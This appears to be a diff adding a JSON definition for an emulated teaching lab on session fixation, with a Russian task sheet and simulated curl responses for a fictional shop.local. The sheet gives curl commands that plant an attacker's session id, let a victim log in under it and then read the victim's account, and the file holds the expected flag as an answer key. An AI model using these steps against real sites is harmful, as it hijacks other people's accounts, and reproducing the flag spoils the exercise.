@@ -1,0 +1,39 @@
+{
+  "id": "web-session-fixation",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{s3ss10n_f1x4t10n_1s_t4k30v3r}"
+  },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: session fixation\n\nЦель — `https://shop.local`. Приложение принимает id сессии из URL-параметра\n`session` и **не меняет** его при входе. Значит, навязав жертве свой id, можно\nвойти в её аккаунт.\n\n1. Проверь, что id берётся из URL (смотри `Set-Cookie`):\n   `curl -s -i 'https://shop.local/login?session=ATTACKER123'`\n2. Жертва логинится, уже имея наш id (сессия не ротируется):\n   `curl -s -i -b 'session=ATTACKER123' -X POST 'https://shop.local/login' --data 'user=victim&pass=x'`\n3. Теперь заходим тем же id — мы внутри аккаунта жертвы:\n   `curl -s -b 'session=ATTACKER123' 'https://shop.local/account' | grep 'nto{' > found.txt`\n4. Набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local)",
+      "cases": [
+        {
+          "match": "login\\?session=",
+          "example": "-s -i 'https://shop.local/login?session=ATTACKER123'",
+          "output": "HTTP/1.1 200 OK\nSet-Cookie: session=ATTACKER123; Path=/\nContent-Type: text/html\n\n<html><body>Please log in.</body></html>\n"
+        },
+        {
+          "match": "POST.*login",
+          "example": "-s -i -b 'session=ATTACKER123' -X POST 'https://shop.local/login' --data 'user=victim&pass=x'",
+          "output": "HTTP/1.1 200 OK\nSet-Cookie: session=ATTACKER123; Path=/\nContent-Type: application/json\n\n{\"ok\":true,\"user\":\"victim\"}\n"
+        },
+        {
+          "match": "account",
+          "example": "-s -b 'session=ATTACKER123' 'https://shop.local/account'",
+          "output": "<h1>Добро пожаловать, admin</h1>\nnto{s3ss10n_f1x4t10n_1s_t4k30v3r}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируются только /login и /account на shop.local.\n"
+    }
+  }
+}
